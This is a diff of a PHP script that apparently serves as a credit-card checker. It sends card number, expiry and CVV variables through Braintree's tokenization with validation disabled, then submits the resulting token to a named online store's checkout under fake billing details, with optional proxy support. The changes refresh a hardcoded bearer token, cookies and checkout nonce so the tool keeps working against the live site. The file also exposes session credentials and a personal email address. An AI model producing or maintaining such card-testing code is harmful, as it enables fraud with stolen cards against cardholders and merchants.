@@ -173,7 +173,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTIxMDQ5OTksImp0aSI6Ijc2NmFjZDFhLWY2NmYtNGE4MS04M2U5LWNlZTkwNDQxMzZhZSIsInN1YiI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQWlyc3RyZWFtSW5jX2luc3RhbnQifX0.1MkDnEppzaS5f6lubkPFSxX2F9M34HevbHm8M5M1T3xgVf5qooPgt6TLNtuGAf1v9SPaCMazfVJbFIcWWxRJkw',
+'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTIxOTI1OTMsImp0aSI6IjA1MDU4NWVhLTBjMDctNGI3Yi04NmIzLTM0YWM4MTQxMTE0NyIsInN1YiI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQWlyc3RyZWFtSW5jX2luc3RhbnQifX0.9qTd_q_90LtO629i4b8WqNwvxbT_vdAXd5Jk1f-FI99-yZ7KoTcfX_XIa_OXqN4C0Y-yyHnMKImRoy7EBu_AbQ',
 'braintree-version: 2018-05-10',
 'content-type: application/json',
 'origin: https://assets.braintreegateway.com',
@@ -181,7 +181,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'user-agent: '.$browser.''
 ));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"10646188-5541-49e0-bbba-2da26e0e3453"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"6f1a5066-cad9-440f-826d-e1456ea0df4e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 
 
 $b_pago = curl_exec($ch);
@@ -206,7 +206,7 @@ $token = trim(strip_tags(getstr($b_pago,'"token":"','"')));
 // // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://airstreamsuplycompany.com/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://airstreamsupplycompany.com/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -239,7 +239,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: __cfduid=d55665530dd99891ba0ee7d71215c38ae1592018202; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22false%22%2C%22username%22:%22null%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3ASCdbWeis28A2IAusgceP44k%2B; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=a7808208a5203b799ee68b46b43426c9%7C%7C1592191395%7C%7C1592187795%7C%7C093b0a8a478f121bfae8ea9a2360f71c; woocommerce_items_in_cart=1; woocommerce_cart_hash=97d0875ca548471533ae727af3f22d8d',
+'cookie: __cfduid=d55665530dd99891ba0ee7d71215c38ae1592018202; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22false%22%2C%22username%22:%22null%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3ASCdbWeis28A2IAusgceP44k%2B; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=a7808208a5203b799ee68b46b43426c9%7C%7C1592191395%7C%7C1592187795%7C%7C093b0a8a478f121bfae8ea9a2360f71c; woocommerce_items_in_cart=1; woocommerce_cart_hash=e3690a2cc1f84544e42861df8a416efd',
 'origin: https://airstreamsupplycompany.com',
 'referer: https://airstreamsupplycompany.com/checkout/',
 'user-agent: '.$browser.''
@@ -247,7 +247,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'shipping_email=pubgkittu%40gmail.com&shipping_phone=&ship_to_different_address=1&shipping_first_name=Vincent&shipping_last_name=Warner&shipping_country=US&shipping_address_1=12+avenue&shipping_address_2=&shipping_city=miami&shipping_state=FL&shipping_postcode=33101&payment_method=braintree_payment_gateway&braintree_payment_gateway_nonce='.$token.'&braintree_device_data=&bfwc_is_vaulted_nonce=&woocommerce-process-checkout-nonce=1b96500a61&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&billing_first_name=Vincent&billing_last_name=Warner&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=miami&billing_state=FL&billing_postcode=33101&billing_email=pubgkittu%40gmail.com&account_password=');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'shipping_email=pubgkittu%40gmail.com&shipping_phone=&ship_to_different_address=1&shipping_first_name=Vincent&shipping_last_name=Warner&shipping_country=US&shipping_address_1=12+avenue&shipping_address_2=&shipping_city=miami&shipping_state=FL&shipping_postcode=33101&payment_method=braintree_payment_gateway&braintree_payment_gateway_nonce='.$token.'&braintree_device_data=&bfwc_is_vaulted_nonce=&woocommerce-process-checkout-nonce=a0c5cce0f8&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&billing_first_name=Vincent&billing_last_name=Warner&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=miami&billing_state=FL&billing_postcode=33101&billing_email=pubgkittu%40gmail.com&account_password=');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
